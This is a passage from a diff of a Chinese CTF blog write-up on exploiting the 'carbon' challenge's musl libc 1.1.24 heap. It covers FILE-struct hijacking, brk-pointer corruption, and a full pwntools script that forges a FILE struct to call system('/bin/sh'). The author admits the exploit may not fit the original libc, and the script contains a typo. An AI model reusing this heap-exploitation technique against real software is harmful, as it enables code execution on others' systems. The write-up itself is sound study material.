close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到最后是有机会调用到file的内部函数指针的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *rpos, *rend;</span><br><span class="line">	<span class="keyword">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *wend, *wpos;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *mustbezero_1;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *wbase;</span><br><span class="line">	<span class="keyword">size_t</span> (*read)(FILE *, <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">size_t</span> (*write)(FILE *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">off_t</span> (*seek)(FILE *, <span class="keyword">off_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="keyword">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">int</span> pipe_pid;</span><br><span class="line">	<span class="keyword">long</span> lockcount;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> lock;</span><br><span class="line">	<span class="keyword">int</span> lbf;</span><br><span class="line">	<span class="keyword">void</span> *cookie;</span><br><span class="line">	<span class="keyword">off_t</span> off;</span><br><span class="line">	<span class="keyword">char</span> *getln_buf;</span><br><span class="line">	<span class="keyword">void</span> *mustbezero_2;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *shend;</span><br><span class="line">	<span class="keyword">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们需要利用exit来执行FSOP，不过难点就是怎么运行到exit，因为需要malloc返回一个0xdeadbeef，在上面可以看到，如果所有的bin都为空，此时malloc就会调用expand_heap来扩展堆，本质还是调用了__expand_heap函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__expand_heap(<span class="keyword">size_t</span> *pn)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">unsigned</span> mmap_step;</span><br><span class="line">	<span class="keyword">size_t</span> n = *pn;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt; SIZE_MAX/<span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	n += -n &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">		brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">		brk += -brk &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)</span><br><span class="line">	    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;</span><br><span class="line">		*pn = n;</span><br><span class="line">		brk += n;</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">void</span> *)(brk-n);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> min = (<span class="keyword">size_t</span>)PAGE_SIZE &lt;&lt; mmap_step/<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line">	<span class="keyword">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ|PROT_WRITE,</span><br><span class="line">		MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	*pn = n;</span><br><span class="line">	mmap_step++;</span><br><span class="line">	<span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在__expand_heap函数中，brk是指向数据段末尾位置的指针。__expand_heap函数调用 brk 系统调用__syscall(SYS_brk, brk+n)，将数据段末尾向后延展n字节，然后延展部分返回给malloc作为新的 chunk 分配给用户</p>
+<p>若程序不开启 PIE，数据段的地址长度为 24 bit（0~0x2000000），内存位置与0xBADBEEF比较接近。若将brk指针修改为0xBADBEEF - n，brk 系统调用就会把数据段延展至0xBADBEEF，使其成为可访问的内存地址。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./carbon&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so&#x27;)</span></span><br><span class="line"><span class="comment"># r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)</span></span><br><span class="line">r = process([<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>, <span class="string">&#x27;./carbon&#x27;</span>])</span><br><span class="line">libc = ELF(<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">option</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(option), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, believer, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Are you a believer? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(believer)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Say hello to your new sleeve &gt;&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">create(<span class="number">0x1</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;Done.&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x29de61</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">bin_addr = libc_base + <span class="number">0x29de00</span> - <span class="number">0x8</span></span><br><span class="line">stdin_addr = libc_base + libc.symbols[<span class="string">&#x27;__stdin_FILE&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binmap_addr = libc_base + <span class="number">0x29da80</span></span><br><span class="line">brk_addr = libc_base + libc.symbols[<span class="string">&#x27;brk&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x20</span>) + p64(stdin_addr -</span><br><span class="line">                                       <span class="number">0x10</span>) + p64(stdin_addr -</span><br><span class="line">                                                   <span class="number">0x10</span>) + p8(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;Y&#x27;</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(stdin_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">file_struct = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">file_struct += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, brk_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, binmap_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 11</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, file_struct)</span><br><span class="line">edit(<span class="number">11</span>, p64(<span class="number">0xbadbeef</span> - <span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendlien(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>然后就是我这里的libc是自己编译的和题目一直有出入，所以我这个exp可能不能直接用在题目上，同时我也问了其他师傅这个编译该怎么办，还在等回复~</p>
+<hr>
+<p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253%23h2-4#h3-14" >https://www.anquanke.com/post/id/202253%23h2-4#h3-14<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">musl1.2.2源码分析+starCTF-BabyNote复现</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/04/17/CTF-examination/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">*CTF-examination</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+        
+    
+</div>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
-
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+            </div>
+        
+    </div>
+</div>
 
 
                 
